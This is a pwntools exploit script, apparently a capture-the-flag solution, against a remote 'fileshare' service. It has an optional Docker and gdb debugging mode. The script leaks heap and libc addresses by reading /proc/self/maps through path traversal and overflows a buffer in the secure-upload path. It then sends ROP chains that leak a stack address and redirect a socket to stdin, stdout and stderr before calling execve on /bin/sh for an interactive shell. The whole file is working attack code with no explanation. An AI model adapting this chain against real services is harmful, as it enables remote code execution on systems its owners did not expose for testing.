from pwn import *
context.arch="amd64"

libc = ELF("./libc-2.31.so",False)
libc.symbols['__libc_argv'] = 0x1f0e70

if 'rem' in sys.argv:
    domain = "fileshare.hackthe.vote"
    conn = remote(domain, 1717)
    conn.recvuntil("port ")
    portno = int(conn.recvuntil("...", drop=True))
else:
    if '-d' in sys.argv:
        os.system("docker exec fileshare pkill -9 fileshare")
        os.system("docker exec fileshare pkill -9 unshare")
        os.system("docker exec fileshare pkill -9 wrapper")
        os.system("docker exec fileshare pkill -9 gdb")
    domain = "0"
    conn = remote(domain, 1717)
    conn.recvuntil("port ")
    portno = int(conn.recvuntil("...", drop=True))
    if '-d' in sys.argv:
        os.system("docker exec fileshare pidof fileshare > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        handle SIGSEGV pass
        c
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("docker cp /tmp/script.gdb fileshare:/tmp/script.gdb")
        run_in_new_terminal("docker exec -it fileshare gdb -q /fileshare %d -x /tmp/script.gdb"%pid)
        pid = pidof("fileshare")[0]
        proc.wait_for_debugger(pid)

def get_tube():
    return remote(domain, portno)

menu = ">>> "
def upload(r, pl):
    r.sendafter(menu, "u\n")
    r.sendafter("upload:\n", pl)
def upload_sec(r, pl, privkey=None, privkeysz=None):
    r.sendafter(menu, "p\n")
    if privkey is not None:
        if privkeysz is None:
            privkeysz = len(privkey)
        r.sendafter("key: ", "%d\n"%privkeysz)
        r.sendafter("key:\n", privkey)
    r.sendafter("upload:\n", pl)
def download(r, path):
    r.sendafter(menu, "d\n")
    r.sendafter("download: ", path+'\n')
def download_sec(r, path):
    r.sendafter(menu, "o\n")
    r.sendafter("download: ", path+'\n')

bof = get_tube()
upload_sec(bof, "A"*0x20, p8(0))
download_sec(bof, "nop")

pad = get_tube()
upload_sec(pad, "A"*0x20, p8(0))
download_sec(pad, "nop")
pad2 = get_tube()

pad3 = get_tube()

download(pad3, "../proc/self/maps")
lns = pad3.recvuntil("[heap]\n")
heap = int(lns.split('\n')[-2].split('-')[0], 16)
print "HEAP: "+hex(heap)
ipc = heap+0x2a0
print "IPC: "+hex(ipc)
lns = pad3.recvuntil("EOF").split('\n')
libc.address = int(lns[-2].split("-")[0], 16)+0x4000
print "LIBC: "+hex(libc.address)

upload_sec(pad3, "A"*0x20, p8(0))
rlist = flat(ipc+0x50*4+0x20, -0x20&0xffffffffffffffff, 0)
upload(pad3, "B"*0x3b0+rlist)
download_sec(pad3, "user5-1")

targ = get_tube()
targ.sendafter(menu, "p\n")
targ.sendafter("key: ", "%d\n"%0x6000)
targ.send("A"*0x3938)

download_sec(bof, ".")
bof.close()
conn.recvuntil("client 2 terminated unexpectedly\n")

nop0 = get_tube()
nop1 = get_tube()

dup = get_tube()
dup.close()
conn.recvuntil("client 9 terminated unexpectedly\n")

vic = get_tube()

rdi = libc.search(asm("pop rdi;ret")).next()
rsi = libc.search(asm("pop rsi;ret")).next()
rdx_r12 = libc.address+0x11c371

rop2 = flat(rdi, 0x14, rsi, 0, libc.symbols['dup2'], rsi, 1, libc.symbols['dup2'], rsi, 2, libc.symbols['dup2'])
rop2 += flat(rdi, libc.search("/bin/sh\0").next(), rsi, 0, rdx_r12, 0, 0, libc.symbols['execve'])

ropaddr = libc.address-0x256c8
rop = flat(rdi, 0x14, rsi, libc.symbols['__libc_argv'], rdx_r12, 8, 0, libc.symbols['write'])
rop += flat(rdi, 0x14, rsi, ropaddr+0x80, libc.symbols['read'])
rop += flat(rdi, 0x14, rsi, 17, rdx_r12, len(rop2), 0, libc.symbols['read'], 0x11)
targ.send(rop)
time.sleep(.5)

vic.send(p8(libc.symbols['read']&0xff))

vic.recvuntil(menu)
stack = u64(vic.recvn(8))-0x1d0
print "STACK: "+hex(stack)

vic.send(flat(stack))
vic.send(rop2)

vic.interactive()
